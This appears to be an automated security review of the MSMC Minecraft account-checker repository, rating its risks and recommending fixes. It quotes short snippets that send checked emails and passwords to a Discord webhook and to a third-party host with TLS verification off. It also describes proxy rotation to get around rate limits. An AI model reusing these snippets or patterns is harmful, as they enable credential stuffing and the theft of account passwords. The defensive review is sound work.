# Security Analysis Report for MSMC Repository

**Analysis Date:** December 14, 2025  
**Repository:** Leopixel1/MSMC  
**Analyzed By:** Automated Security Review

---

## Executive Summary

This security analysis examines the MSMC (Minecraft Account Checker) repository for potentially malicious code and security vulnerabilities. The tool is designed to check Minecraft account credentials through Microsoft's Xbox authentication system.

**Overall Risk Assessment:** ⚠️ **MEDIUM-HIGH RISK**

---

## Project Overview

MSMC is a Windows-based Minecraft account checker that:
- Validates Microsoft/Xbox credentials
- Checks for Minecraft ownership and game pass subscriptions
- Retrieves player statistics from Hypixel and other services
- Supports various proxy types (HTTP, SOCKS4, SOCKS5, Tor)
- Sends notifications via Discord webhooks

---

## Security Findings

### 🔴 Critical Concerns

#### 1. **Credential Handling & Storage**
**Location:** Throughout MSMC.py  
**Risk Level:** CRITICAL

The application handles user credentials (email:password combinations) and stores them in plaintext files:
- `results/{fname}/Hits.txt` (line 265)
- `results/{fname}/2fa.txt` (line 328)
- `results/{fname}/MFA.txt` (line 154)
- `results/{fname}/SFA.txt` (line 158)

**Security Implication:** Sensitive credentials are stored without encryption, making them vulnerable if the system is compromised.

---

#### 2. **External Data Exfiltration via Discord Webhooks**
**Location:** Lines 85-109, 278  
**Risk Level:** CRITICAL

The `Capture.notify()` method sends account credentials and personal information to a Discord webhook:
```python
payload = {
    "content": config.get('message')
        .replace("<email>", self.email)
        .replace("<password>", self.password)
        # ... more sensitive data
}
requests.post(config.get('webhook'), data=json.dumps(payload), ...)
```

**Security Implication:** If a malicious actor gains access to the config file or modifies the webhook URL, all checked credentials would be exfiltrated to an external server controlled by the attacker.

---

#### 3. **Unverified External API Calls**
**Location:** Line 150  
**Risk Level:** HIGH

The code makes requests to a third-party API for email access checking:
```python
out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text)
```

**Security Implications:**
- User credentials are sent to an external service (`email.avine.tools`)
- SSL verification is disabled (`verify=False`)
- The service is undocumented and not well-known
- Potential for man-in-the-middle attacks
- No guarantee the service doesn't log credentials

---

### 🟡 High-Risk Issues

#### 4. **Disabled SSL/TLS Verification**
**Location:** Lines 33, throughout the codebase  
**Risk Level:** HIGH

SSL warnings are suppressed and verification is disabled globally:
```python
urllib3.disable_warnings()
verify=False  # Used in multiple requests throughout
```

**Security Implication:** Makes the application vulnerable to man-in-the-middle attacks. Attackers on the network could intercept credentials.

---

#### 5. **Dependency Vulnerabilities**
**Risk Level:** HIGH

**urllib3 v2.2.2** has known security vulnerabilities:
- CVE: Streaming API improperly handles highly compressed data
- CVE: Allows unbounded number of links in decompression chain
- **Fix:** Update to urllib3 >= 2.6.0

---

#### 6. **Automatic Proxy Scraping from Untrusted Sources**
**Location:** Lines 670-711  
**Risk Level:** MEDIUM-HIGH

The application automatically scrapes proxies from external sources:
- `api.proxyscrape.com`
- Various GitHub repositories
- `proxylist.geonode.com`

**Security Implications:**
- No verification of proxy trustworthiness
- Proxies could be malicious and log traffic
- All authentication requests go through these proxies
- Credentials exposed to potentially hostile proxy operators

---

### 🟠 Medium-Risk Issues

#### 7. **Hardcoded API Endpoints**
**Location:** Multiple locations  
**Risk Level:** MEDIUM

The code contains numerous hardcoded external service URLs:
- `login.live.com` - Microsoft authentication (legitimate)
- `plancke.io` - Hypixel stats
- `sky.shiiyu.moe` - Skyblock stats
- `s.optifine.net` - Cape checking

**Security Implication:** While most appear legitimate, there's no validation or integrity checking.

---

#### 8. **Potential Rate Limiting Bypass**
**Location:** Lines 196, 369-371, 426-429  
**Risk Level:** MEDIUM

The code includes logic to handle rate limiting (HTTP 429) by rotating proxies or waiting:
```python
if check.status_code == 429:
    if len(proxylist) < 5: time.sleep(20)
    Capture.namechange(self)
```

**Security Implication:** Could be used to circumvent rate limiting protections on services, potentially violating Terms of Service.

---

#### 9. **Suppressed Error Output**
**Location:** Lines 34-35, 246-256  
**Risk Level:** MEDIUM

Errors are suppressed in multiple locations:
```python
warnings.filterwarnings("ignore")
sys.stderr = StringIO()  # Redirects errors to nowhere
```

**Security Implication:** Makes debugging difficult and could hide security issues or malicious activity.

---

### 🟢 Informational Findings

#### 10. **Concurrent Credential Testing**
**Location:** Lines 781-783  
**Risk Level:** LOW

Uses ThreadPoolExecutor for concurrent credential checking, which could appear as a brute-force attack to security systems.

---

#### 11. **Ban Checking via Server Connection**
**Location:** Lines 202-259  
**Risk Level:** LOW

Connects to Minecraft servers using checked credentials to determine ban status. This actively uses the credentials, not just validates them.

---

## Potentially Malicious Patterns

### Pattern Analysis

1. **Data Collection:** ✅ Collects sensitive credentials
2. **External Communication:** ✅ Sends data to external services
3. **Encryption:** ❌ No encryption of stored credentials
4. **Obfuscation:** ❌ No code obfuscation detected
5. **Unauthorized Access:** ⚠️ Uses user-provided credentials (consent-based)
6. **Persistence Mechanisms:** ❌ No persistence mechanisms
7. **Privilege Escalation:** ❌ No privilege escalation attempts

---

## Is This Malicious Code?

### Verdict: **NOT INHERENTLY MALICIOUS, BUT HIGH-RISK TOOL**

**Reasoning:**

**Arguments AGAINST being malicious:**
- Code is open-source and transparent
- Purpose is clearly stated (Minecraft account checking)
- No hidden backdoors or obfuscated code detected
- Users consciously provide credentials to be checked
- Webhook URL is user-configurable (not hardcoded to attacker)

**Arguments FOR potential malicious use:**
- Could be used for credential stuffing attacks
- Stores credentials in plaintext
- Sends credentials to external services
- Could violate Microsoft/Mojang Terms of Service
- The tool itself could be weaponized if misconfigured

**Conclusion:** This is a **dual-use tool** - it can be used legitimately by users checking their own accounts, but could also be weaponized for malicious purposes such as:
- Testing stolen credentials
- Account takeover attempts
- Violating service Terms of Service
- Credential harvesting if webhook is replaced

---

## Recommendations

### For Users:
1. ⚠️ **Only use this tool on accounts you own**
2. ⚠️ **Never share your config.ini file** - it may contain webhook URLs
3. ⚠️ **Do not trust unknown proxies** - they can log your credentials
4. ⚠️ **Be aware this may violate Terms of Service** for Microsoft/Mojang
5. ⚠️ **Understand credentials are stored in plaintext** - secure your system
6. ⚠️ **Review the webhook URL** before running to ensure you control it

### For Repository Maintainers:
1. 🔒 **Add encryption for stored credentials**
2. 🔒 **Remove or clearly warn about email.avine.tools API**
3. 🔒 **Enable SSL verification** - add proper certificate handling
4. 🔒 **Update urllib3 to >= 2.6.0** to fix known vulnerabilities
5. 🔒 **Add integrity checking** for external proxy sources
6. 🔒 **Add prominent security warnings** in README
7. 🔒 **Implement rate limiting** to prevent abuse
8. 🔒 **Add Terms of Service compliance notice**

### Immediate Actions:
```bash
# Update vulnerable dependency
pip install --upgrade urllib3>=2.6.0
```

---

## Legal Considerations

⚖️ **Warning:** Using this tool may violate:
- Microsoft Terms of Service
- Mojang/Microsoft EULA
- Computer Fraud and Abuse Act (CFAA) in some jurisdictions
- Anti-hacking laws in various countries

**Using this tool on accounts you don't own is illegal in most jurisdictions.**

---

## Technical Vulnerability Summary

| Vulnerability | Severity | CVSS Score | Status |
|--------------|----------|------------|--------|
| Plaintext Credential Storage | High | 7.5 | Unpatched |
| Disabled SSL Verification | High | 7.4 | Unpatched |
| External Credential Leakage Risk | Critical | 9.1 | Unpatched |
| urllib3 CVE (Decompression) | High | 7.5 | Fix Available |
| Untrusted Proxy Usage | Medium | 6.5 | Unpatched |

---

## Conclusion

While the MSMC codebase does not contain explicitly malicious code like backdoors or trojans, it implements patterns that pose significant security and legal risks. The tool's design enables potential misuse for credential stuffing and account takeover attacks.

**The repository should include prominent warnings about:**
1. Legal implications of use
2. Security risks of the tool
3. Terms of Service violations
4. Proper and improper usage

**Users should be extremely cautious** when using this tool and ensure they:
- Only check their own accounts
- Understand the security implications
- Keep their systems secure (credentials stored in plaintext)
- Do not share configuration files
- Update dependencies regularly

---

## Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Microsoft Terms of Service](https://www.microsoft.com/en-us/servicesagreement)
- [Mojang EULA](https://www.minecraft.net/en-us/eula)
- [Python Security Best Practices](https://python.readthedocs.io/en/stable/library/security_warnings.html)

---

**Report Generated:** 2025-12-14  
**Analysis Tools:** Manual code review, dependency scanning, pattern analysis
